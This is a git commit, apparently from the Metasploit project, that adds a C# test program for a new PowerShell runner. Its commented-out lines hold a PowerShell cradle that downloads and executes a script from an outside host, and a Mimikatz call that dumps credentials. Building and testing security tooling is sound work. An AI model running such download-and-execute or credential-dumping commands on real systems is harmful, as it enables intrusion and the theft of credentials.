5709ff52173d7268170411ae62354734e2b785b4
OJ <oj@buffered.io>
2016-03-21 13:38:09 +1000

    First pass of the new powershell runner type

---
+++ MSF.Powershell/MSF.PowershellTester/Program.cs
@@ -0,0 +1,19 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+
+namespace MSF.PowershellTester
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //using (var x = MSF.Powershell.Runner
+            //{
+            //    x.Execute("IEX (New-Object System.Net.WebClient).DownloadString('https://oj.cx/mk')");
+            //    System.Console.Write(x.Execute("Invoke-Mimikatz -DumpCreds"));
+            //    System.Console.Write(x.Execute("$(whoami)"));
+            //}
+        }
+    }
+}
